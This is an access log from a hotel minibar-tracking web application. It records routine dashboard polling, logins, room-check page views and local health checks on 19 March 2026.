88.231.129.62 - - [19/Mar/2026:14:14:38 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 5237
88.231.129.62 - - [19/Mar/2026:14:14:38 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 30772
88.231.129.62 - - [19/Mar/2026:14:14:39 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 452 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 508338
127.0.0.1 - - [19/Mar/2026:14:14:55 +0300] "GET /health HTTP/1.1" 200 243 "-" "curl/8.14.1" 4609
127.0.0.1 - - [19/Mar/2026:14:15:25 +0300] "GET /health HTTP/1.1" 200 243 "-" "curl/8.14.1" 4556
88.231.129.62 - - [19/Mar/2026:14:15:39 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4932 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 3026
88.231.129.62 - - [19/Mar/2026:14:15:39 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 5609
88.231.129.62 - - [19/Mar/2026:14:15:39 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 27052
88.231.129.62 - - [19/Mar/2026:14:15:39 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 452 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 510296
127.0.0.1 - - [19/Mar/2026:14:15:55 +0300] "GET /health HTTP/1.1" 200 244 "-" "curl/8.14.1" 4148
88.231.129.62 - - [19/Mar/2026:14:15:58 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4932 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 3406
88.231.129.62 - - [19/Mar/2026:14:15:58 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 4212
88.231.129.62 - - [19/Mar/2026:14:15:58 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 26847
88.231.129.62 - - [19/Mar/2026:14:15:58 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 452 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 511488
88.231.129.62 - - [19/Mar/2026:14:16:05 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4933 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 4813
88.231.129.62 - - [19/Mar/2026:14:16:05 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 3716
88.231.129.62 - - [19/Mar/2026:14:16:05 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 191084
88.231.129.62 - - [19/Mar/2026:14:16:05 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 454 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 535680
88.231.129.62 - - [19/Mar/2026:14:16:15 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4931 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 5045
88.231.129.62 - - [19/Mar/2026:14:16:15 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 2661
88.231.129.62 - - [19/Mar/2026:14:16:15 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 452 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 527983
88.231.129.62 - - [19/Mar/2026:14:16:15 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 533168
178.240.236.6 - - [19/Mar/2026:14:16:16 +0300] "GET /executive-dashboard HTTP/1.0" 200 106891 "https://minibartakip.com/sistem-yoneticisi" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 2349673
178.240.236.6 - - [19/Mar/2026:14:16:18 +0300] "GET /static/css/executive-dashboard.css?v=1.1.87 HTTP/1.0" 304 0 "https://minibartakip.com/executive-dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 2615
178.240.236.6 - - [19/Mar/2026:14:16:18 +0300] "GET /static/js/executive_dashboard.js?v=1.1.87 HTTP/1.0" 304 0 "https://minibartakip.com/executive-dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 2402
178.240.236.6 - - [19/Mar/2026:14:16:18 +0300] "GET /api/executive/summary-cards HTTP/1.0" 200 144 "https://minibartakip.com/executive-dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 6349
178.240.236.6 - - [19/Mar/2026:14:16:19 +0300] "GET /api/executive/room-controls?period=today HTTP/1.0" 200 60 "https://minibartakip.com/executive-dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 15772
178.240.236.6 - - [19/Mar/2026:14:16:19 +0300] "GET /api/executive/consumption-trends?period=today HTTP/1.0" 200 59 "https://minibartakip.com/executive-dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 381554
178.240.236.6 - - [19/Mar/2026:14:16:19 +0300] "GET /api/bildirimler?limit=20 HTTP/1.0" 200 55 "https://minibartakip.com/executive-dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 825141
178.240.236.6 - - [19/Mar/2026:14:16:20 +0300] "GET /api/executive/hourly-activity?period=today HTTP/1.0" 200 291 "https://minibartakip.com/executive-dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 988221
178.240.236.6 - - [19/Mar/2026:14:16:21 +0300] "GET /api/executive/top-products?period=today HTTP/1.0" 200 393 "https://minibartakip.com/executive-dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 1513905
178.240.236.6 - - [19/Mar/2026:14:16:22 +0300] "GET /api/executive/activity-feed?limit=30 HTTP/1.0" 200 6759 "https://minibartakip.com/executive-dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 2345638
178.240.236.6 - - [19/Mar/2026:14:16:23 +0300] "GET /system-monitor HTTP/1.0" 200 90518 "https://minibartakip.com/executive-dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 14699
178.240.236.6 - - [19/Mar/2026:14:16:23 +0300] "GET /api/executive/task-completion?period=today HTTP/1.0" 200 222 "https://minibartakip.com/executive-dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 3472028
178.240.236.6 - - [19/Mar/2026:14:16:23 +0300] "GET /api/executive/hotel-comparison?period=today HTTP/1.0" 200 282 "https://minibartakip.com/executive-dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 3482010
178.240.236.6 - - [19/Mar/2026:14:16:24 +0300] "GET /static/css/system_monitor.css?v=1.1.87 HTTP/1.0" 304 0 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 3703
178.240.236.6 - - [19/Mar/2026:14:16:24 +0300] "GET /static/js/system_monitor.js?v=1.1.87 HTTP/1.0" 304 0 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 2875
178.240.236.6 - - [19/Mar/2026:14:16:24 +0300] "GET /api/bildirimler?limit=20 HTTP/1.0" 200 55 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 7293
178.240.236.6 - - [19/Mar/2026:14:16:24 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 4632
178.240.236.6 - - [19/Mar/2026:14:16:24 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4908 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 8354
88.231.129.62 - - [19/Mar/2026:14:16:25 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4921 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 3120
88.231.129.62 - - [19/Mar/2026:14:16:25 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 2777
178.240.236.6 - - [19/Mar/2026:14:16:25 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 349697
88.231.129.62 - - [19/Mar/2026:14:16:25 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 946 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 28875
88.231.129.62 - - [19/Mar/2026:14:16:26 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 452 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 756908
178.240.236.6 - - [19/Mar/2026:14:16:26 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 453 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 1085870
127.0.0.1 - - [19/Mar/2026:14:16:27 +0300] "GET /health HTTP/1.1" 200 243 "-" "curl/8.14.1" 4479
178.240.236.6 - - [19/Mar/2026:14:16:32 +0300] "GET /executive-reports?tab=hotel HTTP/1.0" 200 109066 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 71302
178.240.236.6 - - [19/Mar/2026:14:16:32 +0300] "GET /static/css/executive-reports.css?v=1.1.87 HTTP/1.0" 304 0 "https://minibartakip.com/executive-reports?tab=hotel" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 2474
178.240.236.6 - - [19/Mar/2026:14:16:32 +0300] "GET /static/js/executive_reports.js?v=1.1.87 HTTP/1.0" 304 0 "https://minibartakip.com/executive-reports?tab=hotel" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 2112
178.240.236.6 - - [19/Mar/2026:14:16:33 +0300] "GET /api/executive/reports/filters/personnel HTTP/1.0" 200 848 "https://minibartakip.com/executive-reports?tab=hotel" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 8681
178.240.236.6 - - [19/Mar/2026:14:16:33 +0300] "GET /api/bildirimler?limit=20 HTTP/1.0" 200 55 "https://minibartakip.com/executive-reports?tab=hotel" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 12473
74.125.208.229 - - [19/Mar/2026:14:16:34 +0300] "GET /executive-reports?tab=hotel HTTP/1.0" 302 199 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36 (compatible; Google-Read-Aloud; +https://support.google.com/webmasters/answer/1061943)" 2210
74.125.208.229 - - [19/Mar/2026:14:16:34 +0300] "GET /login HTTP/1.0" 200 13360 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36 (compatible; Google-Read-Aloud; +https://support.google.com/webmasters/answer/1061943)" 11473
88.231.129.62 - - [19/Mar/2026:14:16:34 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4908 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 4604
88.231.129.62 - - [19/Mar/2026:14:16:34 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 3119
88.231.129.62 - - [19/Mar/2026:14:16:34 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 28973
88.231.129.62 - - [19/Mar/2026:14:16:35 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 452 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 508371
178.240.236.6 - - [19/Mar/2026:14:16:37 +0300] "GET /logout HTTP/1.0" 302 199 "https://minibartakip.com/executive-reports?tab=hotel" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 21821
178.240.236.6 - - [19/Mar/2026:14:16:37 +0300] "GET /login HTTP/1.0" 200 13631 "https://minibartakip.com/executive-reports?tab=hotel" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 19991
178.240.236.6 - - [19/Mar/2026:14:16:44 +0300] "POST /login HTTP/1.0" 302 207 "https://minibartakip.com/login" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 281110
178.240.236.6 - - [19/Mar/2026:14:16:44 +0300] "GET /dashboard HTTP/1.0" 302 235 "https://minibartakip.com/login" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 2295
88.231.129.62 - - [19/Mar/2026:14:16:45 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 6648
88.231.129.62 - - [19/Mar/2026:14:16:45 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4921 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 364690
88.231.129.62 - - [19/Mar/2026:14:16:46 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 454 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 1618668
88.231.129.62 - - [19/Mar/2026:14:16:46 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 1708368
88.231.129.62 - - [19/Mar/2026:14:16:55 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4926 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 3322
88.231.129.62 - - [19/Mar/2026:14:16:55 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 2215
88.231.129.62 - - [19/Mar/2026:14:16:55 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 454 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 656511
[2026-03-19 14:16:58,067: INFO/MainProcess] missed heartbeat from celery@23df821c8a0e
88.231.129.62 - - [19/Mar/2026:14:16:58 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 2863366
88.231.129.62 - - [19/Mar/2026:14:16:58 +0300] "GET /api/bildirimler/poll?son_kontrol=2026-03-19T11%3A15%3A57.270Z HTTP/1.0" 200 112 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 15527
127.0.0.1 - - [19/Mar/2026:14:17:02 +0300] "GET /health HTTP/1.1" 200 244 "-" "curl/8.14.1" 715493
88.231.129.62 - - [19/Mar/2026:14:17:05 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4927 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 4955
88.231.129.62 - - [19/Mar/2026:14:17:05 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 3259
88.231.129.62 - - [19/Mar/2026:14:17:05 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 454 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 571474
88.231.129.62 - - [19/Mar/2026:14:17:08 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 2870436
178.240.236.6 - - [19/Mar/2026:14:17:08 +0300] "GET /kat-sorumlusu/dashboard HTTP/1.0" 200 142797 "https://minibartakip.com/login" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 24193208
178.240.236.6 - - [19/Mar/2026:14:17:08 +0300] "GET /static/js/gorev_oncelik.js?v=1.1.87 HTTP/1.0" 304 0 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 2970
178.240.236.6 - - [19/Mar/2026:14:17:09 +0300] "GET /api/bildirimler?limit=20 HTTP/1.0" 200 2016 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 12134
178.240.236.6 - - [19/Mar/2026:14:17:09 +0300] "GET /api/dolum-talepleri HTTP/1.0" 200 41 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 14238
178.240.236.6 - - [19/Mar/2026:14:17:09 +0300] "GET /gorevler/api/bekleyen HTTP/1.0" 200 53 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 43822
88.231.129.62 - - [19/Mar/2026:14:17:15 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 4008
88.231.129.62 - - [19/Mar/2026:14:17:15 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4933 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 5296
88.231.129.62 - - [19/Mar/2026:14:17:15 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 280736
88.231.129.62 - - [19/Mar/2026:14:17:15 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 454 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 530503
178.240.236.6 - - [19/Mar/2026:14:17:25 +0300] "GET /kat-doluluk/21 HTTP/1.0" 200 202355 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 237519
88.231.129.62 - - [19/Mar/2026:14:17:25 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 3252
88.231.129.62 - - [19/Mar/2026:14:17:25 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4934 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 3174
88.231.129.62 - - [19/Mar/2026:14:17:25 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 27821
88.231.129.62 - - [19/Mar/2026:14:17:26 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 454 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 513993
178.240.236.6 - - [19/Mar/2026:14:17:26 +0300] "GET /api/bildirimler?limit=20 HTTP/1.0" 200 2016 "https://minibartakip.com/kat-doluluk/21" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 6950
178.240.236.6 - - [19/Mar/2026:14:17:26 +0300] "GET /gorevler/api/bekleyen HTTP/1.0" 200 53 "https://minibartakip.com/kat-doluluk/21" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 29328
74.125.208.229 - - [19/Mar/2026:14:17:27 +0300] "GET /kat-doluluk/21 HTTP/1.0" 302 199 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36 (compatible; Google-Read-Aloud; +https://support.google.com/webmasters/answer/1061943)" 2675
74.125.208.227 - - [19/Mar/2026:14:17:27 +0300] "GET /login HTTP/1.0" 200 13360 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36 (compatible; Google-Read-Aloud; +https://support.google.com/webmasters/answer/1061943)" 10138
178.240.236.6 - - [19/Mar/2026:14:17:29 +0300] "GET /kat-sorumlusu/oda-kontrol?kat_id=21&oda_id=1191&from_kat_detay=1 HTTP/1.0" 200 115079 "https://minibartakip.com/kat-doluluk/21" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 36984
178.240.236.6 - - [19/Mar/2026:14:17:29 +0300] "GET /static/js/tema_secenekleri.js?v=1.1.87 HTTP/1.0" 200 0 "https://minibartakip.com/kat-sorumlusu/oda-kontrol?kat_id=21&oda_id=1191&from_kat_detay=1" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 3890
